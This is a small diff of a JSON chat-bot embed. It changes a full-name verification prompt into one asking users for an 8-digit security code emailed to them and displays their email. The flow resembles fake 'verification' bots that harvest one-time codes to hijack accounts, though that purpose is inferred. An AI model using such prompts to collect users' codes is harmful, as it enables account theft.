@@ -1,7 +1,15 @@
 {
       "author": {
-        "name": "Enter Your Full Name"
+        "name": "Input Verification Code"
       },
-      "title": "Please enter your full name for manual verification.",
-      "color": 4171755
+      "title": "Please enter the 8-digit security code.",
+      "description": "The code was sent to the email you provided, which is shown below.\nIf you did not receive the code, you can use the buttons below to resend a new code, or re-enter your email address.",
+      "color": 16295218,
+      "fields": [
+        {
+          "name": "PROVIDED EMAIL:",
+          "value": "{email}",
+          "inline": true
+        }
+      ]
     }
